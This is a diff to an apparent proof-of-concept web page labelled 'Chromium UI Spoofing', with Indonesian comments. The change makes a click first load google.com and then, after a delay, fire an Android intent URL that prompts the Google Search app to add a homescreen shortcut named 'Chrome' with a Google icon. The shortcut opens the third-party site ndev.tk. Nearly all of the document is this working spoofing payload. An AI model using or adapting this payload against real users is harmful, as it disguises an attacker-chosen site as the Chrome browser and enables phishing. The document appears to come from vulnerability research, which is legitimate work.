@@ -34,7 +34,7 @@
             padding: 40px 30px;
             border-radius: 12px;
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
-            border: 1px solid `var(--border-color)`;
+            border: 1px solid var(--border-color);
             max-width: 420px;
             width: 100%;
         }
@@ -113,14 +113,14 @@
     <div class="card">
         <div class="banner">Security Research Portal</div>
         <h1>Chromium UI Spoofing</h1>
-        <p>Klik tombol di bawah untuk langsung memicu intent prompt install/shortcut Google Search.</p>
+        <p>Klik tombol di bawah untuk melakukan 1-click redirect ke Google diikuti pemicu intent.</p>
 
         <div class="button-container">
-            <!-- Menggunakan href langsung dengan format intent NDevTK agar tereksekusi 1-click secara instan -->
-            <a href="intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end" 
+            <!-- Href diatur ke Google agar saat diklik langsung mengarah ke google.com, lalu di-handle script untuk intent -->
+            <a href="https://www.google.com" 
                class="button-link" 
                id="spoofLink">
-                Trigger Intent & Install Prompt
+                Open Google & Trigger Intent
             </a>
         </div>
 
@@ -134,8 +134,20 @@
         const statusBox = document.getElementById('statusBox');
 
         spoofLink.addEventListener('click', function(e) {
+            e.preventDefault(); // Mencegah default link agar transisi skrip berjalan mulus
+            
             statusBox.style.display = 'block';
-            statusBox.innerText = 'Status: Intent dispatched successfully.';
+            statusBox.innerText = 'Status: Redirecting to Google & dispatching intent...';
+
+            // Melakukan navigasi beruntun sesuai pola riset (Redirect ke Google lalu memicu intent scheme)
+            setTimeout(function() {
+                window.location.href = 'https://www.google.com';
+            }, 100);
+
+            setTimeout(function() {
+                const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+                window.location.href = intentUrl;
+            }, 600);
         });
     </script>
 
